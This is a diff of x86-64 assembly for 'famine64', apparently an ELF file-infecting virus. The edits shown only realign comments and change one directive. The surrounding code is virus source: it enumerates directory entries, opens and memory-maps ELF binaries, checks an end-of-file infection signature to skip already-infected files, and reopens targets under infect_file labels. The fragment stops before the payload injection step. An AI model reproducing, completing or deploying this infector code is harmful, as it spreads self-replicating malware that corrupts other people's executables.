@@ -13,7 +13,7 @@
 	global famine64_func:function
 	global famine64_size:data
 
-	section .text
+	segment .text
 
 famine64_func:
 	push	rax
@@ -37,11 +37,11 @@ find_files:
 	push 	rdx
 	push 	rdi
 	push 	rsi
-	sub 	rsp, 1040	; char *dirpath, int fd   , int ret   , char b[1024]
-						; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]
+	sub 	rsp, 1040		; char *dirpath, int fd   , int ret   , char b[1024]
+							; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]
 
 	xor 	eax, eax
-	mov 	QWORD [rsp], rdi 		; store dir_path
+	mov 	QWORD [rsp], rdi 			; store dir_path
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int	sys_open(dir_path, 0, 0)                                         ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -50,9 +50,9 @@ find_files:
 	mov 	rdi, QWORD [rsp]
 	mov 	rax, SYS_OPEN
 	syscall
-	cmp 	rax, 0 	 			 	; test if < 0
+	cmp 	rax, 0 	 			 		; test if < 0
 	jl	 	find_files_end
-	mov 	DWORD [rsp + 8], eax  	; store directory fd
+	mov 	DWORD [rsp + 8], eax  		; store directory fd
 loop_file:
 	xor 	eax, eax
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -63,16 +63,16 @@ loop_file:
 	mov 	rdx, 1024
 	mov 	rax, SYS_GETDENTS64
 	syscall
-	test	eax, eax 	 			; test if <= 0
+	test	eax, eax 	 				; test if <= 0
 	jle 	loop_end
-	mov 	DWORD [rsp + 12], eax  	; store getdents64() return value:
+	mov 	DWORD [rsp + 12], eax  		; store getdents64() return value:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; Return a number of bytes between 0 and 1024 (i defined it)            ;;
 	;; In C, we would cast those bytes in struct linux_dirent64 * (see doc.) ;;
 	;; to retreive directory files name                                      ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	xor 	rax, rax
-	xor 	rbx, rbx							; RBX will be the offset of each struct dirent64
+	xor 	rbx, rbx			; RBX will be the offset of each struct dirent64
 	jmp 	check_file_type
 next_file:
 	;; Next struct linux_dirent64*
@@ -119,16 +119,16 @@ get_dat_elf:
 	push 	r9
 	push 	r10
 	push 	r11
-	sub 	rsp, 1024 	 	; char[1024]
- 	 	 	 				; [rsp]
+	sub 	rsp, 1024 	 			; char[1024]
+ 	 	 	 						; [rsp]
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; Concatenate directory path name with file name to open it.            ;;
 	;; The string will be stored in [rsp]                                    ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	xor 	ecx, ecx 	 	; store int i = 0 to do path[i] = dir[i]
+	xor 	ecx, ecx 	 			; store int i = 0 to do path[i] = dir[i]
 	movzx	edx, BYTE [rdi]
-	test	dl, dl 	 		; test directory end of string
+	test	dl, dl 	 				; test directory end of string
 	je  	copy_file
 copy_dir_bytes:
 	mov 	BYTE [rsp + rcx], dl
@@ -138,7 +138,7 @@ copy_dir_bytes:
 	jne 	copy_dir_bytes
 copy_file:
 	add 	rsp, rcx
-	xor 	eax, eax 	 	; store j = 0 to do path[i + j] = file[j]
+	xor 	eax, eax 	 			; store j = 0 to do path[i + j] = file[j]
 	movzx	edx, BYTE [rsi]
 	test	dl, dl
 	je  	open_file
@@ -150,9 +150,9 @@ copy_file_bytes:
 	jne 	copy_file_bytes
 open_file:
 	mov 	BYTE [rsp + rax], 0 	; NULL byte the end of the string path
-	sub 	rsp, rcx 	 	; Return to the start of the string path
-	sub 	rsp, 20 	 	; int fd, size_t size, void *data
- 	 	 					; [rsp] , [rsp + 4]  , [rsp + 12]
+	sub 	rsp, rcx 	 			; Return to the start of the string path
+	sub 	rsp, 20 	 			; int fd, size_t size, void *data
+ 	 	 							; [rsp] , [rsp + 4]  , [rsp + 12]
 	mov 	DWORD [rsp], -1
 	mov 	QWORD [rsp + 4], -1
 	mov 	QWORD [rsp + 12], -1
@@ -164,29 +164,29 @@ open_file:
 	lea 	rdi, [rsp + 20]
 	mov 	rax, SYS_OPEN
 	syscall
-	mov 	DWORD [rsp], eax	; store FD in [rsp]
-	cmp 	rax, 0 	 			; test if fd < 0
+	mov 	DWORD [rsp], eax		; store FD in [rsp]
+	cmp 	rax, 0 	 				; test if fd < 0
 	jl  	get_dat_elf_end
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int	sys_lseek(fd, 1, LSEEK_END)
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edi, eax
 	mov 	esi, 1
-	mov 	edx, 2 	 		; LSEEK_END
+	mov 	edx, 2 	 				; LSEEK_END
 	mov 	rax, SYS_LSEEK
 	syscall
 	mov 	QWORD [rsp + 4], rax	; store SIZE in [rsp + 4]
-	cmp 	rax, 0x40 	 		; test if size of file <= sizeof(Elf64_Ehdr)
+	cmp 	rax, 0x40 	 			; test if size of file <= sizeof(Elf64_Ehdr)
 	jle  	close_file
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; void	*mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)    ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	xor 	edi, edi 	 		; NULL
-	mov 	rsi, rax 	 		; size
-	mov 	edx, 3 	 			; PROT_READ | PROT_WRITE
-	mov 	r10d, 2 	 		; MAP_PRIVATE
-	mov 	r8d, DWORD [rsp] 	; fd
-	xor 	r9, r9 	 			; 0
+	xor 	edi, edi 	 			; NULL
+	mov 	rsi, rax 	 			; size
+	mov 	edx, 3 	 				; PROT_READ | PROT_WRITE
+	mov 	r10d, 2 	 			; MAP_PRIVATE
+	mov 	r8d, DWORD [rsp] 		; fd
+	xor 	r9, r9 	 				; 0
 	mov 	rax, SYS_MMAP
 	syscall
 	mov 	QWORD [rsp + 12], rax	; store ADDRESS in [RSP + 12]
@@ -196,7 +196,7 @@ close_file:
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; int close( fd )                                                       ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	mov 	edi, DWORD [rsp] 	; int fd
+	mov 	edi, DWORD [rsp] 		; int fd
 	mov 	rax, SYS_CLOSE
 	syscall
 
@@ -305,10 +305,10 @@ get_segment:
 	;;    RSI contains the file size
 	;;    RDX contains *data
 check_signature:	
-	mov 	r9, rdx				; *data
-	add 	r9, rsi				; *data + data size
-	sub 	r9, 9				; *data + data size - signature size - 1
-	mov 	r9, QWORD [r9]		; [data + data size - signature size - 1]
+	mov 	r9, rdx					; *data
+	add 	r9, rsi					; *data + data size
+	sub 	r9, 9					; *data + data size - signature size - 1
+	mov 	r9, QWORD [r9]			; [data + data size - signature size - 1]
 	cmp 	r9, QWORD [rel signature]
 	je  	infect_file_end_pop
 
@@ -361,9 +361,9 @@ check_signature:
 	mov 	rdx, QWORD [rsp + 52 + 24]	; stat.st_mode
 	mov 	rax, SYS_OPEN
 	syscall
-	cmp 	eax, 0 	 	 		; test if < 0
+	cmp 	eax, 0 	 	 				; test if < 0
 	jl	 	infect_file_end_add
-	mov 	DWORD [rsp], eax 	; store file fd
+	mov 	DWORD [rsp], eax 			; store file fd
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;; 6. Compute:
